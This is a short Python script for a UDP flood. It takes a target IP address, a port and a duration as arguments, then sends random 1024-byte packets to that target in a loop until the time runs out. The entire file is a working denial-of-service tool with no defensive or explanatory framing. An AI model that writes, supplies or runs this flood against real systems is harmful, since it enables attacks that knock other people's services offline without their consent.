import socket
import random
import sys
import datetime

sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM) #Creates a socket
ip = sys.argv[1]
port = sys.argv[2]
duration = int(sys.argv[3])

start = datetime.datetime.now()

while 1: #Infinitely loops sending packets to the port until the program is exited.
    timeElapsed = datetime.datetime.now() - start
    if(timeElapsed.total_seconds() > duration) :
      break;
    bytes=random._urandom(1024) #Creates packet
    sock.sendto(bytes,(ip,int(port)))
